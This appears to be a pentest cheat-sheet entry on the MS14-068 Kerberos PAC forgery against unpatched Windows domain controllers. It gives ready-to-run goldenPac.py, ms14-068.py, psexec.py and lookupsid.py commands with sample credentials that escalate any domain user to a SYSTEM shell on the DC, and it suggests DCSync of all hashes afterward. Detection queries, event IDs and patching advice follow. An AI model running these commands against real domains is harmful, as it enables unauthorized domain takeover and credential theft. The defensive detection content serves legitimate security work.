name: MS14-068 (goldenPac) - Kerberos PAC Privilege Forgery
description: MS14-068 exploits a flaw in how unpatched Key Distribution Centers validate the Kerberos PAC, letting any domain user forge a ticket claiming Domain Admin membership. Impacket goldenPac.py automates the end-to-end chain: request a ticket, inject a forged PAC, and get a shell as a privileged user on the DC. Still relevant on legacy/unpatched 2008-2012 domains.
notes:
=== PRECONDITIONS ===
  # - A valid (any) domain user account + password
  # - DC missing the MS14-068 patch (KB3011780) - typically 2008/2008R2/2012 pre-Nov-2014
  # - The target DC FQDN (not just IP) for Kerberos

=== ONE-SHOT EXPLOIT (shell on DC) ===
  goldenPac.py <domain>/<user>:<password>@<dc_host>
  # e.g.
  goldenPac.py lab.local/jdoe:Passw0rd!@dc01.lab.local
  # Drops to a SYSTEM shell on the DC via psexec-style execution

=== MANUAL CHAIN (pykek / ms14-068.py) ===
  python ms14-068.py -u <user>@<domain> -p <password> -s <user_sid> -d <dc_host>
  # Produces a TGT.ccache with forged Domain Admin PAC
  export KRB5CCNAME=TGT_<user>@<domain>.ccache
  psexec.py -k -no-pass <domain>/<user>@<dc_host>

=== GET THE USER SID FIRST ===
  lookupsid.py <domain>/<user>:<password>@<dc_ip>
  # or: wmic useraccount get name,sid    (on a domain host)

=== CHECK IF PATCHED ===
  # KB3011780 present => not vulnerable. Modern DCs are patched.

=== RELATED ===
  # Golden Ticket (post-DA) is a different attack: forge TGT with krbtgt hash

examples.label: Manual pykek + psexec
examples.command: python ms14-068.py -u jdoe@lab.local -p Passw0rd! -s S-1-5-21-...-1103 -d dc01.lab.local

references.title: MITRE T1068 - Exploitation for Privilege Escalation

recommended.note: Golden Ticket is the post-DA krbtgt forgery (different attack).
Kerberoasting is an alternative path to privileged creds.
After DC compromise, DCSync all hashes.

defense.why_it_works: Unpatched KDCs accept a PAC signed with any key (including one the attacker controls) instead of only the KDC key, so a forged PAC claiming Domain Admin group membership is trusted - escalating any domain user to DA.
defense.prerequisites: Any valid domain account; a DC missing KB3011780.
defense.impact: Immediate domain compromise (Domain Admin / SYSTEM on the DC) from an unprivileged account.
defense.detection: [MITRE T1068/T1558] 4769/4768 tickets where PAC privileges do not match the account; TGS requests with anomalous PAC; psexec-style service creation on the DC (7045/4697) right after an odd Kerberos exchange; account suddenly acting as DA.
defense.artifacts: Forged ticket usage; service install on DC; mismatch between the account and its effective group membership in logs.
defense.splunk_spl:
index=windows (EventCode=4769 OR EventCode=4768)
| join TargetUserName [search index=windows EventCode=4672]
| table _time, TargetUserName, IpAddress, ServiceName
defense.sentinel_kql:
SecurityEvent
| where EventID in (4768,4769,4672,7045)
| where Computer has "DC"
| project TimeGenerated, EventID, Account, Computer, IpAddress
defense.prevention: PATCH (KB3011780) - the only real fix; this attack is dead on patched DCs. Monitor for privilege mismatches in PAC; alert on unexpected service creation on DCs; retire EOL Windows Server versions.

detections.name: Unexpected privileged logon following Kerberos ticket (MS14-068)
detections.logic:
index=windows EventCode=4672 Computer="*DC*"
| join type=inner TargetLogonId [search index=windows EventCode=4624 LogonType=3]
| table _time, TargetUserName, Computer, IpAddress
detections.tuning: Alert when an account with no DA membership suddenly receives SeTcbPrivilege/admin rights on a DC
